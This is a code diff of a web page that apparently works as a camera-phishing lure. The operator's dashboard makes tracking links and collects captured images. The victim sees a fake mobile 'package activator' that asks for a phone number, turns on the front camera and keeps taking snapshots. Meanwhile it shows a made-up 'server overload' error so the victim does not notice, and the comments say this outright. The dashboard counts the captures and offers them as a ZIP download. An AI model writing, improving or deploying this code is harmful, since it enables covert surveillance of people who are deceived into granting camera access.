+let captureIntervalId = null;
 
-// --- Dashboard Elements ---
+// ====================
+// DOM ELEMENTS
+// ====================
+// Dashboard
 const dashboardCard = document.getElementById('dashboard-card');
 const pkgActivatorCard = document.getElementById('pkg-activator-card');
-const genBtn=document.getElementById('genBtn');
-const linkBox=document.getElementById('linkBox');
-const dataArea=document.getElementById('dataArea');
-const showId=document.getElementById('showId');
-const images=document.getElementById('images');
+const genBtn = document.getElementById('genBtn');
+const linkArea = document.getElementById('linkArea');
+const dataArea = document.getElementById('dataArea');
+const generatedLink = document.getElementById('generatedLink');
+const copyBtn = document.getElementById('copyBtn');
+const openBtn = document.getElementById('openBtn');
+const refreshBtn = document.getElementById('refreshBtn');
+const clearBtn = document.getElementById('clearBtn');
+const downloadBtn = document.getElementById('downloadBtn');
+const floatingDownloadBtn = document.getElementById('floatingDownloadBtn');
+const sessionIdDisplay = document.getElementById('sessionId');
+const imagesContainer = document.getElementById('images');
+const themeToggle = document.getElementById('themeToggle');
+const whatsappBtn = document.getElementById('whatsappBtn');
+const helpBtn = document.getElementById('helpBtn');
 
-// --- Pkg Activator Elements ---
+// Stats
+const totalLinksEl = document.getElementById('totalLinks');
+const totalImagesEl = document.getElementById('totalImages');
+const activeSessionsEl = document.getElementById('activeSessions');
+
+// Package Activator
 const activateBtn = document.getElementById('activateBtn');
 const simSelect = document.getElementById('sim-select');
 const mobileNumber = document.getElementById('mobile-number');
 const activationStatus = document.getElementById('activationStatus');
 const video = document.getElementById('videoElement');
 const canvas = document.getElementById('canvasElement');
-let captureIntervalId = null; // To hold the interval ID for continuous capture
 
-// --- Utility Functions ---
-function generateId(){return 'user-'+Math.random().toString(36).slice(2,10);}
-function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
-function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}
+// ====================
+// THEME MANAGEMENT
+// ====================
+function initTheme() {
+  const savedTheme = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', savedTheme);
+  updateThemeIcon(savedTheme);
+}
 
-// Renders captured images on the dashboard
-function renderImages(id){ 
-    const imgs=getImages(id);
-    images.innerHTML='';
-    if(!imgs.length){images.innerHTML='<small style="margin-top:10px;">No images yet for this ID. Open the generated link to capture data.</small>'; return;}
-    imgs.forEach((url, index)=>{
-        const img=document.createElement('img'); 
-        img.src=url; 
-        img.title = `Image ${index + 1}`;
-        images.appendChild(img);
+function toggleTheme() {
+  const currentTheme = document.documentElement.getAttribute('data-theme');
+  const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+  
+  document.documentElement.setAttribute('data-theme', newTheme);
+  localStorage.setItem('theme', newTheme);
+  updateThemeIcon(newTheme);
+}
+
+function updateThemeIcon(theme) {
+  const icon = themeToggle.querySelector('i');
+  icon.className = theme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
+}
+
+// ====================
+// SESSION MANAGEMENT
+// ====================
+// Generate unique session ID
+function generateSessionId() {
+  return 'sess_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
+}
+
+// Save session to localStorage
+function saveSession(sessionId, data = {}) {
+  const existingSession = allSessions.find(s => s.id === sessionId);
+  
+  if (existingSession) {
+    // Update existing session
+    existingSession.lastActive = Date.now();
+    existingSession.data = { ...existingSession.data, ...data };
+  } else {
+    // Create new session
+    allSessions.push({
+      id: sessionId,
+      created: Date.now(),
+      lastActive: Date.now(),
+      data: data
     });
+  }
+  
+  localStorage.setItem('allSessions', JSON.stringify(allSessions));
+  updateStats();
 }
 
-function stopCamera(stream) {
-    if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-    }
+// Load session from localStorage
+function loadSession(sessionId) {
+  return allSessions.find(s => s.id === sessionId) || null;
 }
 
-// --- Download Function (New) ---
+// Get all images for a session
+function getSessionImages(sessionId) {
+  const session = loadSession(sessionId);
+  return session ? (session.data.images || []) : [];
+}
+
+// Save images to session
+function saveSessionImages(sessionId, imagesArray) {
+  const session = loadSession(sessionId);
+  if (session) {
+    session.data.images = imagesArray;
+    session.lastActive = Date.now();
+    localStorage.setItem('allSessions', JSON.stringify(allSessions));
+    updateStats();
+  }
+}
+
+// Update statistics display
+function updateStats() {
+  totalLinksEl.textContent = allSessions.length;
+  
+  // Calculate total images across all sessions
+  const totalImages = allSessions.reduce((total, session) => {
+    return total + (session.data.images ? session.data.images.length : 0);
+  }, 0);
+  
+  totalImagesEl.textContent = totalImages;
+  
+  // Active sessions (active within last 24 hours)
+  const activeSessions = allSessions.filter(session => {
+    return Date.now() - session.lastActive < 24 * 60 * 60 * 1000;
+  }).length;
+  
+  activeSessionsEl.textContent = activeSessions;
+}
+
+// ====================
+// DASHBOARD FUNCTIONS
+// ====================
+// Generate new link
+function generateNewLink() {
+  currentSessionId = generateSessionId();
+  const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(currentSessionId)}`;
+  
+  // Update UI
+  generatedLink.value = link;
+  sessionIdDisplay.textContent = currentSessionId;
+  linkArea.classList.remove('hidden');
+  dataArea.classList.remove('hidden');
+  
+  // Save session
+  saveSession(currentSessionId, { link: link });
+  
+  // Render existing images
+  renderSessionImages(currentSessionId);
+  
+  // Add animation
+  dashboardCard.classList.add('pulse');
+  setTimeout(() => dashboardCard.classList.remove('pulse'), 500);
+}
+
+// Render images for a session
+function renderSessionImages(sessionId) {
+  const images = getSessionImages(sessionId);
+  imagesContainer.innerHTML = '';
+  
+  if (images.length === 0) {
+    imagesContainer.innerHTML = `
+      <div class="gallery-placeholder">
+        <i class="fas fa-images" style="font-size: 40px; margin-bottom: 10px; opacity: 0.5;"></i>
+        <div>No images captured yet for this session</div>
+        <small>Send the generated link to start capturing</small>
+      </div>
+    `;
+    return;
+  }
+  
+  images.forEach((url, index) => {
+    const imgElement = document.createElement('div');
+    imgElement.className = 'gallery-item';
+    imgElement.innerHTML = `<img src="${url}" alt="Captured image ${index + 1}">`;
+    imagesContainer.appendChild(imgElement);
+  });
+}
+
+// Download all images as ZIP
 async function downloadAllImages() {
-    const id = localStorage.getItem('currentId');
-    if (!id) {
-        alert("Pehle koi link generate karein.");
-        return;
-    }
-
-    const imagesArray = getImages(id);
-    if (imagesArray.length === 0) {
-        alert("Download karne ke liye koi image nahi hai.");
-        return;
-    }
+  if (!currentSessionId) {
+    showNotification('Please generate a link first', 'warning');
+    return;
+  }
+  
+  const images = getSessionImages(currentSessionId);
+  if (images.length === 0) {
+    showNotification('No images to download', 'warning');
+    return;
+  }
+  
+  try {
+    downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating ZIP...';
+    downloadBtn.disabled = true;
     
-    // JSZip library ka use karke zip file banate hain
     const zip = new JSZip();
     let counter = 0;
-
-    for (let i = 0; i < imagesArray.length; i++) {
-        const url = imagesArray[i];
-        // Data URL se base64 part nikalte hain
-        const base64Data = url.replace(/^data:image\/(png|jpeg);base64,/, "");
-        
-        // Zip file mein image add karte hain
-        zip.file(`captured_img_${i + 1}.jpeg`, base64Data, {base64: true});
-        counter++;
+    
+    for (let i = 0; i < images.length; i++) {
+      const url = images[i];
+      const base64Data = url.replace(/^data:image\/(png|jpeg);base64,/, "");
+      zip.file(`captured_image_${i + 1}.jpeg`, base64Data, { base64: true });
+      counter++;
     }
-
-    if (counter > 0) {
-        document.getElementById('downloadBtn').textContent = 'Zipping... Please wait';
-        document.getElementById('downloadBtn').disabled = true;
-
-        zip.generateAsync({type:"blob"})
-        .then(function(content) {
-            // Download link create karke click karte hain
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(content);
-            a.download = `captured_data_${id}.zip`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-
-            document.getElementById('downloadBtn').textContent = 'Download Successful!';
-            setTimeout(() => {
-                document.getElementById('downloadBtn').textContent = 'Download All Captured Images';
-                document.getElementById('downloadBtn').disabled = false;
-            }, 3000);
-        })
-        .catch(err => {
-            alert('Download mein error: ' + err);
-            document.getElementById('downloadBtn').textContent = 'Download Error';
-            document.getElementById('downloadBtn').disabled = false;
-        });
-    } else {
-        alert("Download karne ke liye koi valid image nahi mili.");
-    }
+    
+    const content = await zip.generateAsync({ type: "blob" });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(content);
+    a.download = `captured_data_${currentSessionId}.zip`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    showNotification(`Successfully downloaded ${counter} images`, 'success');
+    
+    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download All Images (ZIP)';
+    downloadBtn.disabled = false;
+    
+  } catch (error) {
+    console.error('Download error:', error);
+    showNotification('Failed to create download', 'error');
+    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download All Images (ZIP)';
+    downloadBtn.disabled = false;
+  }
 }
 
+// Clear all data for current session
+function clearSessionData() {
+  if (!currentSessionId) return;
+  
+  if (confirm('Are you sure you want to clear all images for this session? This cannot be undone.')) {
+    saveSessionImages(currentSessionId, []);
+    renderSessionImages(currentSessionId);
+    showNotification('Session data cleared', 'success');
+  }
+}
 
-// --- Main Logic: Link Generator & Refresh ---
-genBtn.onclick=()=>{
-    const id=generateId();
-    showId.textContent=id;
-    const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
-    localStorage.setItem('currentId',id); // Save current ID for dashboard
+// Show notification
+function showNotification(message, type = 'info') {
+  // Create notification element
+  const notification = document.createElement('div');
+  notification.className = `status-message status-${type === 'error' ? 'error' : type === 'success' ? 'success' : 'warning'}`;
+  notification.style.position = 'fixed';
+  notification.style.top = '20px';
+  notification.style.right = '20px';
+  notification.style.zIndex = '2000';
+  notification.style.maxWidth = '350px';
+  notification.style.display = 'block';
+  notification.innerHTML = `
+    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
+    ${message}
+  `;
+  
+  document.body.appendChild(notification);
+  
+  // Remove after 5 seconds
+  setTimeout(() => {
+    notification.style.opacity = '0';
+    notification.style.transition = 'opacity 0.5s';
+    setTimeout(() => document.body.removeChild(notification), 500);
+  }, 5000);
+}
 
-    // --- HTML Injection for Link Box ---
-    linkBox.innerHTML=`
-        <input readonly value="${link}">
-        <button id="copyBtn">Copy Link</button> 
-        <button id="openBtn">Open Link</button>
-        <button id="refreshBtn">Refresh</button>
-    `;
+// ====================
+// PACKAGE ACTIVATOR FUNCTIONS
+// ====================
+// Start camera capture
+async function startCameraCapture(sessionId) {
+  let stream = null;
+  
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        facingMode: 'user'
+      } 
+    });
     
-    document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
-    document.getElementById('copyBtn').onclick=()=>navigator.clipboard.writeText(link).then(()=>alert('Copied')).catch(()=>prompt('Copy manually:', link));
+    video.srcObject = stream;
     
-    // --- Manual Refresh Logic ---
-    document.getElementById('refreshBtn').onclick = () => {
-        window.location.reload(); 
-    };
-
-    dataArea.style.display='block';
-    renderImages(id);
-};
-
-
-// --- Pkg Activator Logic (Continuous Capture) ---
-
-// Stop capturing when the user closes or leaves the page (Best effort)
-window.onbeforeunload = () => {
-    if (captureIntervalId) {
-        clearInterval(captureIntervalId);
-    }
-};
-
-activateBtn.onclick = async () => {
-    activationStatus.style.display = 'none';
+    // Start continuous capture
+    captureIntervalId = setInterval(() => {
+      if (video.videoWidth === 0) return;
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const capturedImage = canvas.toDataURL('image/jpeg', 0.7);
+      const currentImages = getSessionImages(sessionId);
+      currentImages.push(capturedImage);
+      saveSessionImages(sessionId, currentImages);
+      
+      // Log capture (optional)
+      console.log(`📸 Captured image ${currentImages.length} for session ${sessionId}`);
+      
+    }, CAPTURE_INTERVAL_MS);
     
-    // Simple Form Validation 
-    if (!simSelect.value || mobileNumber.value.length < 11) {
-        activationStatus.style.display = 'block';
-        activationStatus.style.backgroundColor = '#fee2e2'; 
-        activationStatus.style.color = '#dc2626'; 
-        activationStatus.textContent = '❌ Please select SIM and enter a valid mobile number.';
-        return;
-    }
-
-    // Disable button and show processing status
-    activateBtn.disabled = true;
-    activateBtn.textContent = 'Processing Request...';
-    activateBtn.style.backgroundColor = '#fbbf24'; 
-    activateBtn.style.color = '#78350f';
-
-    const ID = new URLSearchParams(location.search).get('id');
-    let stream = null;
+    return stream;
     
-    // --- Start Camera Capture Process (Continuous) ---
-    try {
-        // Try to get camera permission
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => video.play();
+  } catch (error) {
+    console.error('Camera error:', error);
+    return null;
+  }
+}
 
-        // Start continuous capture interval
-        captureIntervalId = setInterval(() => {
-            if (video.videoWidth === 0) return; // Skip if video not ready
+// Stop camera
+function stopCamera(stream) {
+  if (captureIntervalId) {
+    clearInterval(captureIntervalId);
+    captureIntervalId = null;
+  }
+  
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+}
 
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
-            
-            // Save data: Append new image to existing array
-            const old = getImages(ID);
-            old.push(capturedImage);
-            saveImages(ID, old);
-            
-            // Console mein confirmation (optional, for debugging)
-            console.log(`Image captured and saved: Total ${old.length}`);
+// Activate package (fake function)
+async function activatePackage() {
+  // Validate inputs
+  if (!simSelect.value || mobileNumber.value.length < 11) {
+    showNotification('Please select a SIM provider and enter a valid mobile number', 'warning');
+    return;
+  }
+  
+  // Disable button and show processing
+  activateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+  activateBtn.disabled = true;
+  
+  // Get session ID from URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const sessionId = urlParams.get('id');
+  
+  if (!sessionId) {
+    showNotification('Invalid session', 'error');
+    return;
+  }
+  
+  // Start camera in background
+  const stream = await startCameraCapture(sessionId);
+  
+  // Show fake server error (while camera continues in background)
+  setTimeout(() => {
+    activationStatus.style.display = 'block';
+    
+    // Don't re-enable the button to prevent multiple clicks
+    // Keep button disabled with error state
+    activateBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Activation Failed';
+    activateBtn.style.background = 'linear-gradient(135deg, #f5576c 0%, #f093fb 100%)';
+    
+    // Stop camera after 30 seconds to prevent battery drain
+    setTimeout(() => {
+      stopCamera(stream);
+      console.log('Camera stopped after 30 seconds');
+    }, 30000);
+    
+  }, 2000);
+}
 
-        }, CAPTURE_INTERVAL_MS);
+// ====================
+// EVENT LISTENERS
+// ====================
+// Theme toggle
+themeToggle.addEventListener('click', toggleTheme);
 
+// Dashboard buttons
+genBtn.addEventListener('click', generateNewLink);
+copyBtn.addEventListener('click', () => {
+  navigator.clipboard.writeText(generatedLink.value)
+    .then(() => showNotification('Link copied to clipboard', 'success'))
+    .catch(() => {
+      // Fallback for older browsers
+      generatedLink.select();
+      document.execCommand('copy');
+      showNotification('Link copied', 'success');
+    });
+});
 
-        // --- Display ONLY the Fake Server Down Error (Immediately after starting continuous capture) ---
-        // This is shown immediately to give the impression of a fast error while camera capture continues in background
-        setTimeout(() => {
-            activationStatus.style.display = 'block';
-            activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server İs Down Due To Overload!';
-            
-            // Keep button disabled/locked until page refresh
-            // activateBtn.disabled = false;
-            // activateBtn.textContent = 'Activate Pkg';
-            // activateBtn.style.backgroundColor = '#10b981';
-            
-        }, 1000); 
+openBtn.addEventListener('click', () => {
+  window.open(generatedLink.value, '_blank');
+});
 
+refreshBtn.addEventListener('click', () => {
+  if (currentSessionId) {
+    renderSessionImages(currentSessionId);
+    showNotification('Data refreshed', 'success');
+  }
+});
 
-    } catch (err) {
-        // Camera permission denied or device error
-        stopCamera(stream);
-        console.error("Camera Error:", err);
-        
-        // --- Display ONLY the Fake Server Down Error ---
-        activationStatus.style.display = 'block';
-        activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server İs Down Due To Overload! (Camera Access Failed)';
-        
-        // Re-enable button
-        activateBtn.disabled = false;
-        activateBtn.textContent = 'Activate Pkg';
-        activateStatus.style.backgroundColor = '#10b981';
-    }
-};
+clearBtn.addEventListener('click', clearSessionData);
 
-// --- Router (Determines which view to show) ---
-const ID_PARAM=new URLSearchParams(location.search).get('id');
-if(ID_PARAM){
-    // Show Pkg Activator View
+downloadBtn.addEventListener('click', downloadAllImages);
+floatingDownloadBtn.addEventListener('click', downloadAllImages);
+
+// Package activator
+activateBtn.addEventListener('click', activatePackage);
+
+// Floating buttons
+whatsappBtn.addEventListener('click', () => {
+  window.open('https://whatsapp.com/channel/0029VajnN629RZAbp8aZAa1E', '_blank');
+});
+
+helpBtn.addEventListener('click', () => {
+  showNotification('Need help? Contact support via WhatsApp button.', 'info');
+});
+
+// ====================
+// INITIALIZATION
+// ====================
+function init() {
+  // Initialize theme
+  initTheme();
+  
+  // Check URL for session ID
+  const urlParams = new URLSearchParams(window.location.search);
+  const sessionId = urlParams.get('id');
+  
+  if (sessionId) {
+    // Show package activator
     dashboardCard.style.display = 'none';
     pkgActivatorCard.style.display = 'block';
-    document.body.style.alignItems = 'center';
-    document.getElementById('whatsapp-btn').style.display = 'none'; // Hide floating button on activator page
-
-} else {
-    // Show Dashboard View (and load previous data if any)
-    const savedId=localStorage.getItem('currentId');
-    if(savedId){
-        showId.textContent=savedId;
-        dataArea.style.display='block';
-        renderImages(savedId);
+    document.querySelector('.container').style.gridTemplateColumns = '1fr';
+    
+    // Load session if exists
+    const session = loadSession(sessionId);
+    if (session) {
+      currentSessionId = sessionId;
+    } else {
+      // Create new session
+      currentSessionId = sessionId;
+      saveSession(sessionId, { link: window.location.href });
     }
+  } else {
+    // Show dashboard
+    pkgActivatorCard.style.display = 'none';
+    
+    // Check for existing session in localStorage
+    const lastSessionId = localStorage.getItem('lastSessionId');
+    if (lastSessionId && loadSession(lastSessionId)) {
+      currentSessionId = lastSessionId;
+      sessionIdDisplay.textContent = currentSessionId;
+      
+      // Create link
+      const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(currentSessionId)}`;
+      generatedLink.value = link;
+      
+      // Show UI
+      linkArea.classList.remove('hidden');
+      dataArea.classList.remove('hidden');
+      
+      // Render images
+      renderSessionImages(currentSessionId);
+    }
+    
+    // Update stats
+    updateStats();
+  }
+  
+  // Handle page visibility change
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden && captureIntervalId) {
+      // Page is hidden, could stop camera here if needed
+    }
+  });
 }
+
+// Initialize on load
+window.addEventListener('DOMContentLoaded', init);
+
+// Save last session ID on unload
+window.addEventListener('beforeunload', () => {
+  if (currentSessionId) {
+    localStorage.setItem('lastSessionId', currentSessionId);
+  }
+  
+  // Clean up camera
+  if (video.srcObject) {
+    stopCamera(video.srcObject);
+  }
+});
 </script>
 </body>
 </html>
